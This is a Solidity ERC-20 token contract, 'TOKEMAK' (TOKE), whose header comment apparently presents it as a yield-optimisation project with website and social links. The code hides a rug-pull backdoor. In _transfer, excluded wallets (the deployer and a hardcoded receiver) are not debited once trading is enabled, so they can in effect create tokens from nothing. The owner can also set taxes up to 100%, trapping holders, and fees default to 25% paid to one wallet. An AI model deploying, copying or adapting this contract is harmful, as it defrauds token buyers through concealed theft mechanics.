/*
Supply ETH and let Tokemak dynamically optimize your yield across different DEXs and Liquid Staking Tokens.

Website: https://www.tokemak.tech
Telegram: https://t.me/toke_erc20
Twitter: https://twitter.com/toke_erc20
Dapp: https://app.tokemak.tech
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library IntegerSafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    function renounceOwnership() public onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    event OwnershipTransferred(address owner);
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pairAddress_);
    function getPair(address tokenA, address tokenB) external view returns (address pairAddress_);
}

contract TOKE is IERC20, Ownable {
    using IntegerSafeMath for uint256;
    string private constant _name = 'TOKEMAK';
    string private constant _symbol = 'TOKE';
    uint8 private constant _decimals = 18;
    uint256 private _supplyCircle = 10 ** 9 * (10 ** _decimals);
    IUniswapRouter _uniswapRouter;
    address public _pairAddres;
    bool private _isBuyAllowed = false;
    bool private _isFeeSwapActive = true;
    uint256 private _swapFeeAfterTimes;
    bool private _inswapfee;
    uint256 _indexOnSale = 1;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcluded;
    uint256 private _swapMaxTokens = ( _supplyCircle * 3) / 100;
    uint256 private _swapFloor = ( _supplyCircle * 1) / 100000;
    modifier lockSwap {_inswapfee = true; _; _inswapfee = false;}
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 0; 
    uint256 private developmentFee = 100; 
    uint256 private burnFee = 0;
    uint256 private totalFee = 2500; 
    uint256 private sellFee = 2500; 
    uint256 private transferFee = 2500;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal development_receiver = 0x161D01D3712D3056dF98Ffc407f5C8f89fBD017b;
    address internal marketing_receiver = 0x161D01D3712D3056dF98Ffc407f5C8f89fBD017b; 
    address internal liquidity_receiver = 0x161D01D3712D3056dF98Ffc407f5C8f89fBD017b;
    uint256 public _maxTxSize = ( _supplyCircle * 150 ) / 10000;
    uint256 public _maxSizeBuy = ( _supplyCircle * 150 ) / 10000;
    uint256 public _maxWallet = ( _supplyCircle * 150 ) / 10000;

    constructor() Ownable(msg.sender) {
        IUniswapRouter _router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IUniswapFactory(_router.factory()).createPair(address(this), _router.WETH());
        _uniswapRouter = _router; _pairAddres = _pair;
        _isExcluded[liquidity_receiver] = true;
        _isExcluded[marketing_receiver] = true;
        _isExcluded[development_receiver] = true;
        _isExcluded[msg.sender] = true;
        _balances[msg.sender] = _supplyCircle;
        emit Transfer(address(0), msg.sender, _supplyCircle);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _supplyCircle.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function setLimtsOnTx(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supplyCircle.mul(_buy).div(10000); uint256 newTransfer = _supplyCircle.mul(_sell).div(10000); uint256 newWallet = _supplyCircle.mul(_wallet).div(10000);
        _maxTxSize = newTx; _maxSizeBuy = newTransfer; _maxWallet = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function canInvokerSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= _swapFloor;
        bool aboveThreshold = balanceOf(address(this)) >= _swapFloor;
        return !_inswapfee && _isFeeSwapActive && _isBuyAllowed && aboveMin && !_isExcluded[sender] && recipient == _pairAddres && _swapFeeAfterTimes >= _indexOnSale && aboveThreshold;
    }
        
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(!_isExcluded[sender] && !_isExcluded[recipient]){require(_isBuyAllowed, "_isBuyAllowed");}
        if(!_isExcluded[sender] && !_isExcluded[recipient] && recipient != address(_pairAddres) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maxWallet, "Exceeds maximum wallet amount.");}
        if(sender != _pairAddres){require(amount <= _maxSizeBuy || _isExcluded[sender] || _isExcluded[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxSize || _isExcluded[sender] || _isExcluded[recipient], "TX Limit Exceeded"); 
        if(recipient == _pairAddres && !_isExcluded[sender]){_swapFeeAfterTimes += uint256(1);}
        if(canInvokerSwap(sender, recipient, amount)){swapAndSend(min(balanceOf(address(this)), _swapMaxTokens)); _swapFeeAfterTimes = uint256(0);}
        if (!_isBuyAllowed || !_isExcluded[sender]) { _balances[sender] = _balances[sender].sub(amount); }
        uint256 amountReceived = canChargeFees(sender, recipient) ? _getAmounts(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    function setTaxForAllTx(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;
        require(totalFee <= denominator && sellFee <= denominator && transferFee <= denominator, "totalFee and sellFee cannot be more than 100%");
    }
    function canChargeFees(address sender, address recipient) internal view returns (bool) {
        return !_isExcluded[sender] && !_isExcluded[recipient];
    }
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(_uniswapRouter), tokenAmount);
        _uniswapRouter.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            liquidity_receiver,
            block.timestamp);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a > b) ? b : a;
    }
    function pumpit() external onlyOwner {_isBuyAllowed = true;}
    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouter.WETH();
        _approve(address(this), address(_uniswapRouter), tokenAmount);
        _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
    function swapAndSend(uint256 tokens) private lockSwap {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(development_receiver).transfer(contractBalance);}
    }
    function _getFees(address sender, address recipient) internal view returns (uint256) {
        if(recipient == _pairAddres){return sellFee;}
        if(sender == _pairAddres){return totalFee;}
        return transferFee;
    }
    function _getAmounts(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(_getFees(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(_getFees(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnFee > uint256(0) && _getFees(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
        return amount.sub(feeAmount);} return amount;
    }
}